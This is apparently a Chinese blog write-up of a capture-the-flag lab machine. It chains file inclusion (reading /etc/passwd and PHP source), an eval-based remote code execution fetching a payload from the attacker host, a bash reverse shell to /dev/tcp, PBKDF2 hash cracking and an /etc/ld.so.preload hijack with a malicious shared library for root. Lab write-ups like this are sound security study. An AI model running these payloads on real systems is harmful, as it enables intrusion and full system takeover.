---
{"dg-publish":true,"title":"Community_touch","tags":["blog"],"dg-path":"安全/靶机/Community_touch.md","permalink":"/安全/靶机/Community_touch/","dgPassFrontmatter":true}
---

# 主机发现
![Pasted image 20250202160145.png](/img/user/picture/Pasted%20image%2020250202160145.png)

![Pasted image 20250202160228.png](/img/user/picture/Pasted%20image%2020250202160228.png)





# web渗透

![Pasted image 20250202160508.png](/img/user/picture/Pasted%20image%2020250202160508.png)
没扫出来什么东西，看看特定文件类型试试


```shell
sudo dirb http://192.168.124.22/ -X .zip,.php,.html,.txt
```

![Pasted image 20250202160910.png](/img/user/picture/Pasted%20image%2020250202160910.png)

后面两个文件有些可疑，可以ffuf测一测

```shell
ffuf -u http://192.168.124.22/test.php\?FUZZ\=FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -c -v -fs 14
```

![Pasted image 20250202161431.png](/img/user/picture/Pasted%20image%2020250202161431.png)

![Pasted image 20250202162252.png](/img/user/picture/Pasted%20image%2020250202162252.png)

这个参数和`index.php`参数好像一样
![Pasted image 20250202163653.png](/img/user/picture/Pasted%20image%2020250202163653.png)

![Pasted image 20250202163707.png](/img/user/picture/Pasted%20image%2020250202163707.png)




竟然能文件读取
```shell
curl "http://192.168.124.22/test.php?do=/etc/passwd"
<h1>test</h1>
tryroot:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
welcome:x:1001:1001::/home/welcome:/bin/sh
mysql:x:106:113:MySQL Server,,,:/nonexistent:/bin/false
```



看一下配置文件
```shell
curl "http://192.168.124.22/test.php?do=/etc/nginx/nginx.conf"
<h1>test</h1>
tryuser www-data;
worker_processes auto;
pid /run/nginx.pid;
include /etc/nginx/modules-enabled/*.conf;

events {
        worker_connections 768;
        # multi_accept on;
}

http {

        ##
        # Basic Settings
        ##

        sendfile on;
        tcp_nopush on;
        tcp_nodelay on;
        keepalive_timeout 65;
        types_hash_max_size 2048;
        # server_tokens off;

        # server_names_hash_bucket_size 64;
        # server_name_in_redirect off;

        include /etc/nginx/mime.types;
        default_type application/octet-stream;

        ##
        # SSL Settings
        ##

        ssl_protocols TLSv1 TLSv1.1 TLSv1.2; # Dropping SSLv3, ref: POODLE
        ssl_prefer_server_ciphers on;

        ##
        # Logging Settings
        ##

        access_log /var/log/nginx/access.log;
        error_log /var/log/nginx/error.log;
        client_max_body_size 500M;
        client_body_buffer_size 128k;
        fastcgi_intercept_errors on;
        ##
        # Gzip Settings
        ##

        gzip on;

        # gzip_vary on;
        # gzip_proxied any;
        # gzip_comp_level 6;
        # gzip_buffers 16 8k;
        # gzip_http_version 1.1;
        # gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript;

        ##
        # Virtual Host Configs
        ##

        include /etc/nginx/conf.d/*.conf;
        include /etc/nginx/sites-enabled/*;
}


#mail {
#       # See sample authentication script at:
#       # http://wiki.nginx.org/ImapAuthenticateWithApachePhpScript
#
#       # auth_http localhost/auth.php;
#       # pop3_capabilities "TOP" "USER";
#       # imap_capabilities "IMAP4rev1" "UIDPLUS";
#
#       server {
#               listen     localhost:110;
#               protocol   pop3;
#               proxy      on;
#       }
#
#       server {
#               listen     localhost:143;
#               protocol   imap;
#               proxy      on;
#       }
#}

```


有一个日志文件路径，但是尝试读取，未果


尝试读取文件源码
```shell
curl "http://192.168.124.22/test.php?do=php://filter/convert.base64-encode/resource=test.php"
<h1>test</h1>
tryPGgxPnRlc3Q8L2gxPgo8P3BocAogICAgaWYoaXNzZXQoJF9HRVRbJ2RvJ10pKQogICAgewogICAgICAgIGVjaG8gJ3RyeSc7CiAgICAgICAgaWYoJF9HRVRbJ2RvJ10gPT09ICJpbmRleC5waHAiKSB7CiAgICAgICAgICAgICAgICBkaWUoJ0VSUk9SJyk7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgIGluY2x1ZGUgJF9HRVRbJ2RvJ107CiAgICAgICAgfQogICAgfQo/Pgo=%
```

**test.php**
```php
<h1>test</h1>
<?php
    if(isset($_GET['do']))
    {
        echo 'try';
        if($_GET['do'] === "index.php") {
                die('ERROR');
        } else {
                include $_GET['do'];
        }
    }
?>

```

**tools.php**
```php
<h1>tools</h1>
<?php
if(isset($_POST['flowermagic']))
{
if($_POST['flowermagic'] !== "index.php" )
eval(file_get_contents($_POST['flowermagic']));
}
?> 
```

home.php
```php
<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>凛冽時雨 - 公式ウェブサイト</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <header>
        <h1>凛冽時雨</h1>
        <nav>
            <ul>
                <li><a href="?do=album_1.php">アルバム 1</a></li>
                <li><a href="?do=album_2.php">アルバム 2</a></li>
                <li><a href="?do=album_3.php">アルバム 3</a></li>
                <li><a href="?do=album_4.php">アルバム 4</a></li>
                <li><a href="?do=album_5.php">アルバム 5</a></li>
                <li><a href="?do=album_6.php">アルバム 6</a></li>
            </ul>
        </nav>
    </header>

    <main>
        <section class="intro">
            <h2>凛冽時雨について</h2>
            <p>「凛冽時雨」（りんとしてしぐれ、Ling tosite sigure）は、日本の3人組ロックバンドで、2002年に結成されました。彼らは独特の音楽スタイルと前衛的なアプローチで知られ、激しいギターとピアノ、そして独特なボーカルが特徴的です。</p>
            <p>現事務所は「Moving On」、音楽レーベルはソニー・ミュージックエンタテインメント傘下の「Sony Music Associated Records」です。日本の音楽シーンで長い歴史を誇るバンドであり、その音楽は深い感情と複雑な構造を持っています。</p>
        </section>
        
        <section class="albums">
            <h3>アルバム一覧</h3>
            <ul>
                <li><a href="?do=album_1.php">アルバム 1: 《film A moment》 (2011年4月27日)</a></li>
                <li><a href="?do=album_2.php">アルバム 2: 《flowering》 (2012年6月27日)</a></li>
                <li><a href="?do=album_3.php">アルバム 3: 《contrast》 (2014年3月5日)</a></li>
                <li><a href="?do=album_4.php">アルバム 4: 《unravel》 (2014年7月23日)</a></li>
                <li><a href="?do=album_5.php">アルバム 5: 《Fantastic Magic》 (2014年8月27日)</a></li>
            </ul>
        </section>
    </main>

    <footer>
        <p>&copy; 2025 凛冽時雨. All rights reserved.</p>
    </footer>
</body>
</html>


```

index.php
```php
<?php
    $albums = array(
        'album_1.php',
        'album_2.php',
        'album_3.php',
        'album_4.php',
        'album_5.php',
        'album_6.php'
    );

    if(isset($_GET['do']) && in_array($_GET['do'], $albums)) {
        include $_GET['do']; 
    } else {
        include 'home.php';
    }
?>

```


尝试利用tools.php拿取webshell

```shell
curl -X POST -d "flowermagic=http://192.168.124.10/test.txt" "http://192.168.124.22/tools.php"
```

而test.txt文件内容为
```txt
file_put_contents('/tmp/proof.txt', 'RCE成功!');
```

```shell
curl "http://192.168.124.22/test.php?do=/tmp/proof.txt"
```

![Pasted image 20250202185858.png](/img/user/picture/Pasted%20image%2020250202185858.png)

可以看到确实可以


修改test.txt
```txt
shell_exec('bash -c "bash -i >& /dev/tcp/192.168.124.10/443 0>&1"');
```
再触发一下
```shell
curl -X POST -d "flowermagic=http://192.168.124.10/test.txt" "http://192.168.124.22/tools.php"
```
![Pasted image 20250202193119.png](/img/user/picture/Pasted%20image%2020250202193119.png)


拿到webshell



# 提权-1（白给版）

用脚本扫一下
![Pasted image 20250202195031.png](/img/user/picture/Pasted%20image%2020250202195031.png)

**/usr/bin/bash**：具有SUID和SGID权限的bash。如果能够执行这个bash，可能会直接获得root shell。可以尝试执行`/usr/bin/bash -p`，-p参数会保留有效用户ID，可能直接提权。

![Pasted image 20250202195120.png](/img/user/picture/Pasted%20image%2020250202195120.png)




```shell
curl -X POST -d "flowermagic=http://192.168.124.10/test.txt" "http://192.168.124.23/tools.php"
```






# 提权-2.1

![Pasted image 20250203114025.png](/img/user/picture/Pasted%20image%2020250203114025.png)
在网站这个目录下发现有一个隐藏的密码备份
```txt
pbkdf2:sha256:50000:flower:0916690d7bc2f92a0e1f1640ce7ee22e988843323efb8c8e43064eafed92b028
```

尝试用hashcat破解

![Pasted image 20250203125523.png](/img/user/picture/Pasted%20image%2020250203125523.png)

```shell
> echo -n "0916690d7bc2f92a0e1f1640ce7ee22e988843323efb8c8e43064eafed92b028" | xxd -r -p|base64
CRZpDXvC+SoOHxZAzn7iLpiIQzI++4yOQwZOr+2SsCg=

> echo -n "flower" | base64
Zmxvd2Vy

```
//其中密文要先将从16进制还原为原始的二进制格式，再将其进行base64编码
![Pasted image 20250203144510.png](/img/user/picture/Pasted%20image%2020250203144510.png)
//我也是才知道，对于密码方面我的经验还是太少了

```
sha256:50000:Zmxvd2Vy:CRZpDXvC+SoOHxZAzn7iLpiIQzI++4yOQwZOr+2SsCg=
```

```shell
hashcat -m 10900 -a 0 hash wordlist.txt
```


![Pasted image 20250203130321.png](/img/user/picture/Pasted%20image%2020250203130321.png)

密码也就是
```txt
roseflower
```


![Pasted image 20250203130456.png](/img/user/picture/Pasted%20image%2020250203130456.png)




# 提权-2.2


![Pasted image 20250203145229.png](/img/user/picture/Pasted%20image%2020250203145229.png)

这里也有一个隐藏的提示
```txt
"touch" it
```

![Pasted image 20250203145727.png](/img/user/picture/Pasted%20image%2020250203145727.png)
![Pasted image 20250203145633.png](/img/user/picture/Pasted%20image%2020250203145633.png)

下面复刻大佬的提权方案：
```shell
umask 000 
touch file //这样就可以创建666,即可读可写的root用户文件
```

---
下面记一下**umask**

`umask` 命令用来设置或显示文件创建时的默认权限掩码。`umask 000` 这条命令的意思是将文件或目录的默认权限掩码设置为 `000`，从而影响新创建文件的权限。

 **权限掩码解释：**

- `umask` 是用来限制文件创建时的权限，它通过从默认权限（通常是 `666` 对于文件和 `777` 对于目录）中“减去”掩码的值来决定实际权限。
    
- 默认情况下：
    
    - 文件的默认权限是 `666`（rw-rw-rw-），意味着文件的所有者、所属组和其他用户都可以读写该文件。
    - 目录的默认权限是 `777`（rwxrwxrwx），意味着所有者、所属组和其他用户都可以读、写、执行目录内容。


**`umask` 设置的作用范围**：

- `umask` 是基于 **当前用户会话** 或 **进程** 的。它影响的是你运行程序（例如 `touch`）时文件创建的默认权限。
- 当你在你的会话中设置了 `umask 000`，它会影响该会话中的所有程序，包括你用来创建文件的程序。即使你使用的是具有 `SUID` 的 `touch` 命令，**`umask` 仍然会影响文件的默认权限**，因为 `umask` 影响的是文件的权限，而不是文件的所有者。

---


```shell
> strace touch 2>&1 | grep -Pi "open|access|no such file"
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
openat(AT_FDCWD, "/usr/lib/locale/locale-archive", O_RDONLY|O_CLOEXEC) = 3
openat(AT_FDCWD, "/usr/share/locale/locale.alias", O_RDONLY|O_CLOEXEC) = 3
openat(AT_FDCWD, "/usr/share/locale/en_US.UTF-8/LC_MESSAGES/coreutils.mo", O_RDONLY) = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/usr/share/locale/en_US.utf8/LC_MESSAGES/coreutils.mo", O_RDONLY) = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/usr/share/locale/en_US/LC_MESSAGES/coreutils.mo", O_RDONLY) = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/usr/share/locale/en.UTF-8/LC_MESSAGES/coreutils.mo", O_RDONLY) = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/usr/share/locale/en.utf8/LC_MESSAGES/coreutils.mo", O_RDONLY) = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/usr/share/locale/en/LC_MESSAGES/coreutils.mo", O_RDONLY) = -1 ENOENT (No such file or directory)
```

这个命令的目的是检查`touch`命令在执行过程中是否涉及打开文件、访问文件，或者遇到“文件不存在”（`no such file`）的情况。


看一下靶机上也不存在这个文件
![Pasted image 20250203152350.png](/img/user/picture/Pasted%20image%2020250203152350.png)

现在的思路就是**劫持一个恶意的so进去让它加载**

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unlink("/etc/ld.so.preload");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

```shell
gcc -shared -fPIC evil.c -o evil.so -nostartfiles
```

```shell
welcome@listen:/tmp$ ls -al /etc/ld.so.preload
ls: cannot access '/etc/ld.so.preload': No such file or directory
welcome@listen:/tmp$ umask 000
welcome@listen:/tmp$ touch /etc/ld.so.preload
welcome@listen:/tmp$ ls -al  /etc/ld.so.preload
-rw-rw-rw- 1 root root 0 Feb  3 02:37 /etc/ld.so.preload
welcome@listen:/tmp$ echo "/tmp/evil.so" > /etc/ld.so.preload
welcome@listen:/tmp$ cat /etc/ld.so.preload
/tmp/evil.so

```

![Pasted image 20250203173048.png](/img/user/picture/Pasted%20image%2020250203173048.png)

.XD
```txt
SWYgdSB3YW5uYSBmaW5kIG1lLCBzZWFyY2ggJ2Zsb3dlcndpdGNoJy4=
ZTMgODEgOGEgZTMgODEgYWQgZTMgODEgOGMgZTMgODEgODQgZTMgODAgODEgZTUgODcgOWIgZTMgODEgYTggZTMgODEgOTcgZTMgODEgYTYgZTYgOTcgYjYgZTkgOWIgYTggZTMgODIgOTIgZTggODEgYjQgZTMgODEgODQgZTMgODEgYTY=
```










